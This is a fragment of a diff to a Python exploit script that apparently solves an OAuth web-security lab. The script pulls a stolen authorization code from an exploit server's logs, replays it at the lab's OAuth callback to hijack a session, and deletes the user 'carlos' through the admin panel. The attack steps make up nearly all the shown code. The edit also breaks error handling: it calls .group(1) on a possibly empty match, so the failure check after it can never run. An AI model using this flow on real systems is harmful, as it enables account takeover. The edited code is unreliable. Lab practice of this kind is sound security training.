@@ -250,13 +250,11 @@ time.sleep(3)
 # Step 6: Read the exploit server logs to extract the stolen code
 response_2 = session_1.get(f"{EXPLOIT}/log")
 
-stolen_code = re.search(r"code=([A-Za-z0-9_-]+)", response_2.text)
+stolen_code = re.search(r"code=([A-Za-z0-9_-]+)", response_2.text).group(1)
 
 if not stolen_code:
     print("Failed to steal code")
     exit(1)
-
-stolen_code = stolen_code.group(1)
 
 print(f"Stolen authorization code: {stolen_code}")
 
@@ -270,6 +268,7 @@ session_2.get(f"{LAB}/oauth-callback?code={stolen_code}", allow_redirects=True)
 
 # Step 8: Access admin panel and delete carlos
 response_3 = session_2.get(f"{LAB}/admin/delete?username=carlos")
+
 print("Carlos deleted" if response_3.status_code == 200 else "Failed to delete carlos")
 ```
 
